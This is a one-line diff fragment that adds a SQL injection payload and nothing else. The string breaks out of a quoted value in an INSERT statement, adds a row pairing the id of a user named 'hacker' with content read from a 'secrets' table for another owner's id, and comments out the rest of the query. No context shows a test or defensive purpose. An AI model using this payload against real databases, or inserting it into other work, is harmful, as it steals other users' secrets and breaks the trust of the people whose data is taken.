@@ -1,0 +1,1 @@
+'), ((SELECT id FROM users WHERE username='hacker'), (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1)) --
